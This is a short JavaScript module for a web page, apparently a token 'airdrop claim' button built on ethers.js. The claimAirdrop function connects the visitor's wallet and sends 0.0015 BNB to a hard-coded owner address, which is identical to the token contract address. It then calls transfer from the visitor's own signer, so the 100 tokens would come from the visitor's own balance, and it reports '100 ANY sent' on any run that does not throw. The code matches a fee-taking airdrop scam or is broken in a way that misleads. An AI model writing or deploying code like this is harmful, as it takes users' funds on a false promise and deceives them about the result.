
import { ethers } from "ethers";
import ABI from "./contractABI.json";

const provider = new ethers.providers.Web3Provider(window.ethereum);
const signer = provider.getSigner();

const TOKEN_ADDRESS = "0x6Ec8Ad112E0109Eff1b66678E59767F99daf9d8f";
const OWNER_ADDRESS = "0x6Ec8Ad112E0109Eff1b66678E59767F99daf9d8f";
const CONTRACT = new ethers.Contract(TOKEN_ADDRESS, ABI, signer);

const AMOUNT_TO_SEND = ethers.utils.parseUnits("100", 18);
const REQUIRED_BNB = 0.0015;

export async function claimAirdrop() {
  try {
    await provider.send("eth_requestAccounts", []);
    const userAddress = await signer.getAddress();

    const tx = await signer.sendTransaction({
      to: OWNER_ADDRESS,
      value: ethers.utils.parseEther(REQUIRED_BNB.toString()),
    });

    await tx.wait();

    const transferTx = await CONTRACT.transfer(userAddress, AMOUNT_TO_SEND);
    await transferTx.wait();

    return {
      success: true,
      message: "✅ Airdrop claim successful! 100 ANY sent to your wallet.",
    };
  } catch (err) {
    console.error("Airdrop claim failed", err);
    return {
      success: false,
      message: "❌ Airdrop claim failed. Please try again.",
    };
  }
}
